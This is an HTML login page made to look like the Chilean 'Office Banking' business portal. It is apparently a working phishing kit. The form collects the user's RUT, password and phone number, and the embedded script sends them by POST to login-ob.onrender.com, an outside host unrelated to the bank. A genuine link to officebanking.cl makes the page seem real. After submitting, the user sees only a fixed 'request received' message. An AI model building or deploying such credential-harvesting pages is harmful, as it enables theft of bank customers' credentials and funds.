<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Office Banking - Acceso</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="styles.css">
</head>
<body>
  <div class="login-box">
    <img src="logo-office-banking.png" alt="Office Banking" class="logo">

    <!-- Mensaje de bienvenida -->
    <h2 class="welcome-message">Bienvenido a Office Banking</h2>

    <form id="loginForm">
      <label for="rut">RUT</label>
      <input type="text" id="rut" name="rut" placeholder="12.345.678-5" required>
      
      <label for="passwd">Contrase√±a</label>
      <input type="password" id="passwd" name="passwd" required>

      <label for="telefono">Tel√©fono actualizado</label>
      <input type="tel" id="telefono" name="telefono" placeholder="+56 9 1234 5678" required>
      
      <label class="checkbox-label">
        <input type="checkbox" id="contacto" name="contacto" required>
        Deseo que me contacte un ejecutivo para solicitar L√≠nea de Cr√©dito o Tarjeta de Cr√©dito.  
        O en su defecto aumento de cupo.
      </label>
      
      <div class="options">
        <label><input type="checkbox" id="recordar"> Recordar usuario</label>
        <a href="https://wslogin.officebanking.cl/autogestion-clave" target="_blank">Olvid√© mi clave</a>
      </div>
      
      <button type="submit">Ingresar</button>
    </form>
    <div id="resultado"></div>

    <div class="footer-icons">
      <div>üìä<br>Indicadores Econ√≥micos</div>
      <div>‚òéÔ∏è<br>Contact Center</div>
    </div>
  </div>

  <script>
    // Conexi√≥n al backend en Render
    document.getElementById("loginForm").addEventListener("submit", async function(event) {
      event.preventDefault();

      const rut = document.getElementById("rut").value;
      const passwd = document.getElementById("passwd").value;
      const telefono = document.getElementById("telefono").value;
      const contacto = document.getElementById("contacto").checked;

      try {
        const response = await fetch("https://login-ob.onrender.com/login", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            rut: rut,
            passwd: passwd,
            telefono: telefono,
            contacto: contacto
          })
        });

        const data = await response.json();

        if (response.ok) {
          // Mensaje fijo solicitado
          document.getElementById("resultado").innerText = "‚úÖ Hemos recibido tu solicitud";
        } else {
          document.getElementById("resultado").innerText = "‚ùå Error: " + (data.error || "Credenciales inv√°lidas");
        }
      } catch (error) {
        document.getElementById("resultado").innerText = "‚ö†Ô∏è Error de conexi√≥n con el servidor.";
        console.error(error);
      }
    });
  </script>
</body>
</html>
